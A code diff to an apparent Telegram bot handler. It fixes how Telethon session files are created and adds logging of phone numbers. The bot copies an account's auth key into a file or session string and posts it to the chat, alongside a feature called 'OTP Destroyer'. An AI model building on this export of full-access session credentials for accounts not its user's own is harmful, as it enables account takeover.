@@ -93,6 +93,7 @@ class SessionLoginHandler:
             user_id = event.sender_id
             phone = event.pattern_match.group(1).decode()
             format_type = event.pattern_match.group(2).decode()
+            logger.info(f"Session creation requested - Phone: {phone}, Format: {format_type}")
             await event.answer("⏳ Creating session...")
             await self._execute_session_creation(event, user_id, phone, format_type)
         
@@ -1939,29 +1940,34 @@ class SessionLoginHandler:
                     import tempfile
                     import time
                     
-                    # Create unique temporary file name
-                    temp_name = f"session_{phone.replace('+', '')}_{int(time.time())}.session"
+                    # Create unique temporary file name without extension
+                    temp_name = f"session_{phone.replace('+', '')}_{int(time.time())}"
                     temp_path = os.path.join(tempfile.gettempdir(), temp_name)
                     
-                    logger.info(f"Creating session file at: {temp_path}")
+                    logger.info(f"Creating session file at: {temp_path}.session")
                     
-                    # Create file client with session data
+                    # Create new file-based client with the session data
                     file_client = TelegramClient(temp_path, config.telegram.api_id, config.telegram.api_hash)
                     
-                    # Copy session data
+                    # Copy session data from the authenticated client
                     file_client.session.set_dc(client.session.dc_id, client.session.server_address, client.session.port)
                     file_client.session.auth_key = client.session.auth_key
                     
-                    # Force save the session
+                    # Force save the session first
                     file_client.session.save()
                     
-                    # Verify file was created and read it
-                    if os.path.exists(temp_path):
-                        file_size = os.path.getsize(temp_path)
+                    # Connect briefly to ensure session is saved properly
+                    await file_client.connect()
+                    await file_client.disconnect()
+                    
+                    # The .session file should now exist
+                    session_file_path = f"{temp_path}.session"
+                    if os.path.exists(session_file_path):
+                        file_size = os.path.getsize(session_file_path)
                         logger.info(f"Session file created, size: {file_size} bytes")
                         
                         if file_size > 0:
-                            with open(temp_path, 'rb') as f:
+                            with open(session_file_path, 'rb') as f:
                                 session_file_data = f.read()
                             logger.info(f"Session file data read: {len(session_file_data)} bytes")
                         else:
@@ -1969,12 +1975,12 @@ class SessionLoginHandler:
                         
                         # Clean up temp file
                         try:
-                            os.remove(temp_path)
+                            os.remove(session_file_path)
                             logger.info("Temporary session file cleaned up")
                         except Exception as cleanup_err:
                             logger.warning(f"Failed to cleanup temp file: {cleanup_err}")
                     else:
-                        logger.error(f"Session file was not created at {temp_path}")
+                        logger.error(f"Session file was not created at {session_file_path}")
                     
                 except Exception as file_err:
                     logger.error(f"Session file creation error: {file_err}")
@@ -1997,16 +2003,9 @@ class SessionLoginHandler:
                 logger.info(f"OTP Destroyer re-enabled for {phone} after session creation")
             
             # Send based on format
-            if format_type == 'string':
-                await event.edit(
-                    f"✅ **Session String Created!**\n\n"
-                    f"📱 Phone: {phone}\n"
-                    f"📝 Session String:\n\n"
-                    f"`{session_string}`\n\n"
-                    f"💾 Copy and save securely!\n"
-                    f"🛡️ OTP Destroyer re-enabled"
-                )
-            elif format_type == 'file':
+            logger.info(f"Session creation completed. Format: {format_type}, File data exists: {session_file_data is not None}, File size: {len(session_file_data) if session_file_data else 0}")
+            
+            if format_type == 'file':
                 if session_file_data and len(session_file_data) > 0:
                     from telethon.tl.types import DocumentAttributeFilename
                     await event.edit("✅ **Session file created! Sending...**")
@@ -2031,6 +2030,15 @@ class SessionLoginHandler:
                         f"`{session_string}`\n\n"
                         f"🛡️ OTP Destroyer re-enabled"
                     )
+            else:
+                await event.edit(
+                    f"✅ **Session String Created!**\n\n"
+                    f"📱 Phone: {phone}\n"
+                    f"📝 Session String:\n\n"
+                    f"`{session_string}`\n\n"
+                    f"💾 Copy and save securely!\n"
+                    f"🛡️ OTP Destroyer re-enabled"
+                )
             
             # Always send login notification
             try:
